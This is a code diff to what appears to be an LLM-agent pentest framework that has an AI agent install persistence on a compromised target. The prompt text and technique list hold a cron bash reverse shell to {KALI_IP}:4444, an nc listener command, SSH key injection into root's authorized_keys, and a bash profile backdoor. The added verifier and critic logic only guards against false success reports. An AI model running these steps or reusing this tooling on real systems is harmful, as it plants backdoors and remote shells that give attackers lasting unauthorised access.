@@ -193,6 +193,13 @@ Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not 
 2. tool_session_command("3", "echo \\"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1'\\" | crontab -")
 3. tool_session_command("3", "crontab -l")                      ← verify cron is set ON TARGET
 
+**Cron reverse-shell note:** the cron entry will try to connect back to
+{KALI_IP}:4444 every minute. If you want to CONFIRM it actually fires (not just
+that it is listed), start a background listener on Kali first so the connection
+is not refused: tool_linux_terminal("nohup nc -lvnp 4444 >/tmp/persist_listener.log 2>&1 &").
+Otherwise, verification will rely on confirming the entry is listed, the cron
+daemon is running, and the shell binary exists.
+
 **Step-by-step example for SSH key injection (session 3):**
 
 1. tool_linux_terminal("ssh-keygen -t rsa -f /tmp/persist_key -N \\"\\"")   ← generate key on KALI
@@ -200,6 +207,11 @@ Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not 
 3. tool_session_command("3", "mkdir -p ~/.ssh && chmod 700 ~/.ssh")          ← create dir ON TARGET
 4. tool_session_command("3", "echo '<pubkey contents>' >> ~/.ssh/authorized_keys")  ← inject key ON TARGET
 5. tool_session_command("3", "chmod 600 ~/.ssh/authorized_keys")             ← set perms ON TARGET
+
+**IMPORTANT for SSH key injection:** `<pubkey contents>` / `<PUBKEY>` is a PLACEHOLDER.
+You MUST copy the ACTUAL public key text returned by `cat /tmp/persist_key.pub` (step 2)
+and paste it verbatim into the echo command in step 4. Do NOT echo the literal string
+`<PUBKEY>` or invent a fake key — a non-RSA value makes the SSH login verification fail.
 
 **When done, provide a text summary of what was installed and where.**
 Do not make any more tool calls after providing your summary.
@@ -226,8 +238,18 @@ SSH Key:
 - Expected: returns the username without password prompt
 
 Cron Job:
-- ON TARGET: `tool_session_command("<session_id>", "crontab -l")`
-- Expected: see the reverse shell cron entry
+- A `crontab -l` listing alone is NOT sufficient — an entry that references a
+  missing shell, a wrong path, or runs while the cron daemon is stopped will
+  silently fail every minute. Confirm ALL THREE of the following:
+  1. ON TARGET: `tool_session_command("<session_id>", "crontab -l")`
+     Expected: the reverse-shell cron entry is listed.
+  2. ON TARGET: `tool_session_command("<session_id>", "service cron status || systemctl is-active cron || systemctl is-active crond")`
+     Expected: cron daemon is running/active.
+  3. ON TARGET: `tool_session_command("<session_id>", "which bash")`
+     Expected: the shell binary referenced by the entry exists (e.g. /bin/bash).
+- If the cron entry is a reverse shell, you cannot directly confirm it fires
+  without a listener on Kali. Treat it as WORKING only when all three checks
+  above pass: entry listed AND cron daemon active AND shell binary present.
 
 Systemd Service:
 - ON TARGET: `tool_session_command("<session_id>", "systemctl is-enabled <service>")`
@@ -366,7 +388,11 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "chmod 600 /root/.ssh/authorized_keys")  # on TARGET',
             ],
             "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no root@<target> whoami",
-            "notes": "Reliable. Requires SSH service on target (port 22).",
+            "notes": ("Reliable. Requires SSH service on target (port 22). "
+                      "IMPORTANT: <PUBKEY> is a PLACEHOLDER — you MUST replace it with the "
+                      "actual public key text printed by `cat /tmp/persist_key.pub` (step 2). "
+                      "Do NOT inject the literal string <PUBKEY> or a made-up key — a "
+                      "non-RSA value will make the SSH login verification fail."),
         })
         techniques.append({
             "name": "New user account with SSH",
@@ -405,7 +431,11 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "chmod 600 ~/.ssh/authorized_keys")  # on TARGET',
             ],
             "verification": "tool_linux_terminal: ssh -i /tmp/persist_key -o StrictHostKeyChecking=no <user>@<target> whoami",
-            "notes": "Requires SSH service on target.",
+            "notes": ("Requires SSH service on target. "
+                      "IMPORTANT: <PUBKEY> is a PLACEHOLDER — you MUST replace it with the "
+                      "actual public key text printed by `cat /tmp/persist_key.pub` (step 2). "
+                      "Do NOT inject the literal string <PUBKEY> or a made-up key — a "
+                      "non-RSA value will make the SSH login verification fail."),
         })
         techniques.append({
             "name": "Bash profile backdoor",
@@ -604,9 +634,18 @@ def verifier_node(state: PersistenceState) -> dict:
 
     print_colored("\n[Persistence Verifier] Testing mechanism...", Colors.HEADER)
 
-    # Count verifier tool calls
+    # Count verifier tool calls in THIS cycle only.
+    # Two cycle boundaries, whichever is hit first walking backwards:
+    #   1. The executor's tagged summary (normal entry into the verifier).
+    #   2. A "CRITIC FEEDBACK" HumanMessage — this marks the start of a fresh
+    #      retry cycle. On a FAIL->retry, stale ToolMessages from the PREVIOUS
+    #      verifier cycle still live in the (operator.add) message list; without
+    #      this guard they get counted against the new verifier's budget and
+    #      short-change it (e.g. starting at 3/5 on entry).
     verifier_tool_count = 0
     for msg in reversed(messages):
+        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in (msg.content or ""):
+            break
         if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
             # Hit executor's tagged summary = start of verifier cycle.
             # Rely solely on the explicit tag (executor now always tags its
@@ -615,6 +654,10 @@ def verifier_node(state: PersistenceState) -> dict:
                 break
         if isinstance(msg, ToolMessage):
             verifier_tool_count += 1
+    print_colored(
+        f"[Persistence Verifier] Tool count this cycle: {verifier_tool_count}",
+        Colors.WARNING,
+    )
 
     # Build context for verifier
     if verifier_tool_count == 0:
@@ -666,6 +709,29 @@ def critic_node(state: PersistenceState) -> dict:
     persistence_plan = state.get("persistence_plan", "")
     install_result = state.get("install_result", "")
     verification_result = state.get("verification_result", "")
+
+    # HARD GUARD: never let the critic LLM emit PASS on absent verification.
+    # If the verifier produced no text-only assessment (hit its tool cap with
+    # empty content, or the loop exited before it ran), verification_result is
+    # the initial empty string. The CRITIC_PROMPT says "Both required for PASS"
+    # but the LLM can still false-PASS on a blank section, so we short-circuit
+    # a mandatory FAIL in code without consulting the model.
+    if not (verification_result or "").strip():
+        print_colored(
+            "[Persistence Critic] No verification output captured — forcing FAIL.",
+            Colors.FAIL,
+        )
+        return {
+            "messages": [HumanMessage(content=(
+                "CRITIC FEEDBACK: VERDICT: FAIL\n"
+                "METHOD: unknown\n"
+                "ASSESSMENT: Verification was not performed — no output captured.\n"
+                "FEEDBACK: Re-run the verifier and confirm the mechanism actually "
+                "works before judging. Do not report success without verification."
+            ))],
+            "loop_step": current_step + 1,
+            "critic_verdict": "FAIL",
+        }
 
     evidence = (
         f"PERSISTENCE PLAN:\n{persistence_plan}\n\n"
@@ -766,6 +832,11 @@ def route_after_verifier(state: PersistenceState) -> Literal["verifier_tools", "
     if hasattr(last_msg, "tool_calls") and last_msg.tool_calls:
         tool_count = 0
         for m in reversed(state["messages"]):
+            # Mirror verifier_node's cycle-boundary detection: stop at a fresh
+            # retry boundary so stale prior-cycle ToolMessages do not inflate
+            # the count and trip the cap early.
+            if isinstance(m, HumanMessage) and "CRITIC FEEDBACK" in (m.content or ""):
+                break
             if isinstance(m, AIMessage) and not m.tool_calls and m.content:
                 break
             if isinstance(m, ToolMessage):
